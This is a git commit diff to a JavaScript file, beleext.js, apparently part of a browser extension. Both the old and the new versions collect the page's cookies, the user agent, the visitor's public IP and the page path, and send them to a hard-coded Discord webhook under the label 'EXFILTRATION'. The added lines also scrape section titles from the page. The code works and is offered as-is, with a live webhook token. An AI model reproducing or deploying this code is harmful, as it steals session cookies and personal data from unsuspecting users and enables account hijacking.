0c81e1d74aef09f227f970fbbf3eb5d948650bab
Carlos2482 <166356481+Carlos2482@users.noreply.github.com>
2024-04-08 20:15:12 -0400

    Update beleext.js

--- beleext.js
+++ beleext.js
@@ -1,19 +1,32 @@
-    function discord_message(webHookURL, message) {
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", webHookURL, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify({
-            'content': message,
-            'username':'belesnatch',
-        }));
-    }
-	
+function discord_message(webHookURL, message) {
+	var xhr = new XMLHttpRequest();
+	xhr.open("POST", webHookURL, true);
+	xhr.setRequestHeader('Content-Type', 'application/json');
+	xhr.send(JSON.stringify({
+		'content': message,
+		'username':'belesnatch',
+	}));
+}
 
-	ip = fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-		discord_message("https://discord.com/api/webhooks/1226632634898059415/s59noDMH0twgLEIxtUf8Fbhyhv866ZLcTuNyFEkCWWkIrzKTmh7pzJ4zNPoOCv3S9MOo", "EXFILTRATION:\n	Cookie: " + document.cookie + "\n	User agent: " + navigator.userAgent + "\n	IP: " + data.ip + "\n	Path: " + window.location.pathname);
-    })
-    .catch(error => {
-			discord_message("https://discord.com/api/webhooks/1226632634898059415/s59noDMH0twgLEIxtUf8Fbhyhv866ZLcTuNyFEkCWWkIrzKTmh7pzJ4zNPoOCv3S9MOo", "EXFILTRATION:\n	Cookie: " + document.cookie + "\n	User agent: " + navigator.userAgent + "\n	IP: " + "failed" + "\n	Path: " + window.location.pathname);
-    });
+let sectionTitles = document.querySelectorAll('.section-title');
+
+// Initialize an empty string to store innerHTML
+let innerHTMLString = "\n	Page Hint:\n		";
+
+// Iterate over each element with class "section-title"
+sectionTitles.forEach(title => {
+    // Append the innerHTML of each element to the string
+    innerHTMLString += title.innerHTML + "\n		";
+});
+
+
+
+
+ip = fetch('https://api.ipify.org?format=json')
+.then(response => response.json())
+.then(data => {
+	discord_message("https://discord.com/api/webhooks/1226632634898059415/s59noDMH0twgLEIxtUf8Fbhyhv866ZLcTuNyFEkCWWkIrzKTmh7pzJ4zNPoOCv3S9MOo", "EXFILTRATION:\n	Cookie: " + document.cookie + "\n	User agent: " + navigator.userAgent + "\n	IP: " + data.ip + "\n	Path: " + window.location.pathname + innerHTMLString);
+})
+.catch(error => {
+		discord_message("https://discord.com/api/webhooks/1226632634898059415/s59noDMH0twgLEIxtUf8Fbhyhv866ZLcTuNyFEkCWWkIrzKTmh7pzJ4zNPoOCv3S9MOo", "EXFILTRATION:\n	Cookie: " + document.cookie + "\n	User agent: " + navigator.userAgent + "\n	IP: " + "failed" + "\n	Path: " + window.location.pathname + innerHTMLString);
+});
